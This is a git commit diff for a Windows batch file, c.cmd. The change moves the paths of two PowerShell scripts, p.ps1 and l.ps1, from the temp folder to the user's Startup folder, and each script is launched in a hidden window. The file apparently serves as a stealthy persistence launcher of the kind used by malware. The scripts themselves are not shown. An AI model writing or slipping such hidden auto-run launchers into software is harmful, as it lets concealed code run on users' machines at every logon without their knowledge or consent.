0fea81a88f35a5fa39d3a194e5f6aa9b0ab2161e
gabrielg13rojas <gabrielg13rojas@gmail.com>
2023-05-04 10:34:35 -0400

    Update c.cmd

--- c.cmd
+++ c.cmd
@@ -1,3 +1,3 @@
 @echo off
-powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
-powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"
+powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/p.ps1"
+powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/l.ps1"
